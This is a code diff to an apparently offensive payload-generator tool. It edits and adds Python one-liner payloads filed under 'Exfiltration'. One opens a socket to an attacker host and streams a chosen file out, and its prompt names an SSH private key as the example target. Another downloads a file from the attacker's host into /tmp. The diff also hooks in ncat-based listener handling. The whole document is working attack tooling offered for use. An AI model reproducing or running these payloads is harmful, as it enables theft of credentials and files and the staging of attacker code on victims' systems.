@@ -6,6 +6,7 @@ var blue = log.cyan
 var black = log.blackBright
 var green = log.green
 var red = log.red
+var question = require('../modules/questionUser');
 
 var ncat = require("../modules/ncat.js")
 
@@ -78,14 +79,22 @@ Load({
 
 Load({
 	title: "Send File via Socket Connection",
-	payload:'python -c \'exec """\nimport socket;import sys;s = socket.socket();s.connect(("$$LHOST$$",$$LPORT$$));f=open ("$$PROMPT$$", "rb");l = f.read(1024)\nwhile (l):\n    s.send(l)\n    l = f.read(1024)\ns.close();"""\'',
-	sample: 'python -c \'exec """\nimport socket;import sys;s = socket.socket();s.connect(("$$LHOST$$",$$LPORT$$));f=open ("$$PROMPT$$", "rb");l = f.read(1024)\nwhile (l):\n    s.send(l)\n    l = f.read(1024)\ns.close();"""\'',
+	payload:'python -c \'exec """\nimport socket;import sys;s = socket.socket();s.connect(("<LHOST>",<LPORT>));f=open ("<PROMPT>", "rb");l = f.read(1024)\nwhile (l):\n    s.send(l)\n    l = f.read(1024)\ns.close();"""\'',
 	category: "Exfiltration",
 	callback: function(returnToPrepare){
 		ncat.Init(returnToPrepare, "Which file would you like to exfiltrate? (ex: /.ssh/id_rsa)", "file")
 	}
 })
-// 
+
+Load({
+	title: "Download File via Python",
+	payload:'python -c \'import urllib;urllib.urlretrieve ("http://<LHOST>:<LPORT>/<PROMPT>","/tmp/<PROMPT>");\'',
+	category: "Exfiltration",
+	callback: function(returnToPrepare){
+		question.ask("What file would you like to download? (ex: script.sh)", returnToPrepare)
+	}
+})
+
 
 var unique = []
 var uniqueCategories = []
